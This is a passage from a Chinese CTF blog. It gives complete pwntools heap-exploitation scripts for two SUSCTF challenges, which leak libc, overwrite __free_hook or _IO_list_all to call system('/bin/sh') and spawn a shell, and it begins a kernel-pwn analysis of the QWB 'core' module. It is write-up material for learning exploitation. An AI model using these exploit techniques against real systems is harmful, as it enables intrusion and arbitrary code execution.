class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;FRAME&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span>():</span></span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x150</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x60</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rain</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x0000000000401694&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        m()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Table:            &#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    <span class="comment"># payload=p32(0x100)+p32(0x100)+&#x27;\x02&#x27;+&#x27;\x01&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=p32(300)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(18,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;__malloc_hook&#x27;]+0x10+96)*2</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0x50+18,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment"># config(payload)</span></span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Table:            &quot;</span>)</span><br><span class="line">    heap_addr = u64(sh.recv(<span class="number">4</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    rain()</span><br><span class="line">    libc.address=libc_base</span><br><span class="line">    pay=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    pay+=p32(<span class="number">4</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    pay=pay.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(pay)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(heap_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;S0_Beautiful_Rain_adasda&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>首先远程很玄学，其次堆的地址的长度其实不是固定的，我的虚拟机上是6个字节，导致我以为远程也是6个字节，然后一直接收错误，麻了。</p>
<h2 id="happytree"><a href="#happytree" class="headerlink" title="happytree"></a>happytree</h2><p>感觉漏洞不是很容易察觉，就是在有一个子节点的节点被删除时指向子节点的地址不会被删除，也就是多个指针指向同一个堆块（大忌），利用这一点可以直接doublefree，但是doublefree也不是随便就能搞的，在操作中很容易造成树变成循环树了，在删除节点时直接报错。然后暴露libc地址的时候也是利用malloc申请bins上的节点时不会清除fd和bk，所以从unsorted上申请到的堆的bk上就有libc地址（也可以利用这一点得知heap地址，但对此题无益）,至于怎么填满tcache把堆放置到unsorted上，也是利用程序申请节点时的整数溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;124.71.147.225&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tree</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_tree(<span class="number">0xf0</span>+(<span class="number">7</span>-i)*<span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show_tree(<span class="number">0xf0</span>+<span class="number">7</span>*<span class="number">0x100</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xa0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xb0</span>)</span><br><span class="line">    add_tree(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0x40</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xc0</span>)</span><br><span class="line">    del_tree(<span class="number">0</span>)</span><br><span class="line">    add_tree(<span class="number">0x1c0</span>,p64(free_hook))</span><br><span class="line">    add_tree(<span class="number">0x2c0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>)</span><br><span class="line">    add_tree(<span class="number">0x3c0</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;We_4re_pl4ying_unDer_th3_tRee&#125;</span></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/" class="post-title-link" itemprop="url">kernelpwn第二道题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-11 21:52:11 / 修改时间：21:52:36" itemprop="dateCreated datePublished" datetime="2022-02-11T21:52:11+08:00">2022-02-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelrop"><a href="#kernelrop" class="headerlink" title="kernelrop"></a>kernelrop</h1><p>不知道为啥今天忽然很累（可能是昨晚没睡好？），不怎么想学习，但想起来自己的kernelpwn才入门两天，不能在这个时候颓废，还是撸起袖子加油干吧。</p>
<p>今天看kernelpwn的第二道题</p>
<p>找题找了一会，忽然翻到了一个大佬的博客，是需要仰望的那种，很厉害啊。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h3><p>启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kernelstudy/pwn2/give_to_player$ cat ./start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-append选项是启动时的附加选项，’quiet kaslr’代表启动kaslr，其他的我也看不懂😴</p>
<p>文件系统的init</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br></pre></td></tr></table></figure>

<p>有几行不能理解做了做下记录</p>
<p><strong>/proc/kallsyms</strong>:开发者为了方便调试内核代码，将内核中的所有函数和非栈变量的地址抽取出来，形成一个符号表（符号对应地址），kallsyms就能查看这个符号表，<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>就是把/proc/kallsyms保存到tmp/kallsyms中去.</p>
<p><strong>ktr_restrict&amp;dmesg_restrict</strong>:这个文件控制是否可以打印内核地址，当他等于0的时候是可以直接通过kallsyms直接打印地址，当等于1的时候就不能能直接打印了。dmesg_restrict文件能够控制dmesg命令能否直接打印内核缓存区的值，当他为1的时候dmesg就不能直接打印。两个命令的组合拳导致无法直接/proc/kallsyms查看内核地址，但是没有禁止/tmp/kallsyms。</p>
<p><strong>poweroff -d 120 -f &amp;</strong>:这是定时关机的命令，直接注释掉</p>
<p>通过init文件的查看可以锁定core.ko,通过checksec查看保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/rootfs/core.cpio/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>对昨天关于内核保护和用户态保护有个初步的猜想，.ko文件估计两个保护都有，可见有canary保护和nx.</p>
<h4 id="ko文件分析"><a href="#ko文件分析" class="headerlink" title=".ko文件分析"></a>.ko文件分析</h4><p><strong>init_module</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是模块被加载到内核的执行的，proc_create函数的作用是在proc文件夹在产生一个虚拟的文件core,用户态就可以利用这个文件和模块通信了。</p>
<p><strong>core_ioctl</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置了三条命令，分别是core_read()，设置全局变量off(我的判断：不是栈空间的变量就是全局变量)，和core_copy_func().</p>
<p><strong>core_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把从&amp;v5[off]开始拷贝64个字节到用户态。off我们可控，那就代表着泄露敏感信息。<code>__asm &#123; swapgs &#125;</code>这个是切换用户态和内核态的指令。</p>
<p><strong>core_copy_func</strong></p>
